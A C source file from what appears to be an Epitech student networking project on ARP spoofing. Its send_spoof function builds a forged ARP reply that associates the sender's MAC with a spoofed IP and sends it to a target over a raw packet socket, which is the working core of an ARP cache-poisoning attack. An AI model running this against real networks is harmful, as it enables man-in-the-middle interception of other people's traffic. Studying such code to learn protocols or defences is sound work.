/*
** EPITECH PROJECT, 2018
** NWP_myarpspoof_2018
** File description:
** spoof.c
*/

#include "arpspoofing.h"

int send_spoof(arp_t *arp, int fd)
{
    struct ethhdr *send_req = (struct ethhdr *)arp->buffer;
    arphdr_t *arp_req = (arphdr_t *)(arp->buffer + ETH2_LEN);

    arp->socket_address.sll_family = AF_PACKET;
    arp->socket_address.sll_protocol = htons(ETH_P_ARP);
    arp->socket_address.sll_ifindex = arp->ifindex;
    arp->socket_address.sll_hatype = htons(ARPHRD_ETHER);
    arp->socket_address.sll_pkttype = (PACKET_BROADCAST);
    arp->socket_address.sll_halen = MAC_LEN;
    arp->socket_address.sll_addr[6] = 0x00;
    arp->socket_address.sll_addr[7] = 0x00;

    memset(arp->buffer, 0, sizeof(arp->buffer));
    memcpy(send_req->h_dest, arp->target_mac, MAC_LEN);
    memcpy(arp_req->dest_mac, arp->target_mac, MAC_LEN);
    memcpy(send_req->h_source, arp->mac, MAC_LEN);
    memcpy(arp_req->src_mac, arp->mac, MAC_LEN);
    memcpy(arp->socket_address.sll_addr, arp->mac, MAC_LEN);

    send_req->h_proto = htons(ETH_P_ARP);
    arp_req->hardware_type = htons(HW_TYPE);
    arp_req->protocol_type = htons(ETH_P_IP);
    arp_req->hardware_len = MAC_LEN;
    arp_req->protocol_len = IPV4_LEN;
    arp_req->opcode = htons(ARP_REPLY);

    memcpy(arp_req->src_ip, &arp->src, sizeof(uint32_t));
    memcpy(arp_req->dest_ip, &arp->dst, sizeof(uint32_t));

    arp->ret = sendto(fd, arp->buffer, 42, 0,
        (struct sockaddr *)&arp->socket_address, sizeof(arp->socket_address));
    if (arp->ret == -1)
        error("Sendto failed");

    printf("Spoofed packet sent to '%s'\n", arp->dest);
    sleep(1);

    return (0);
}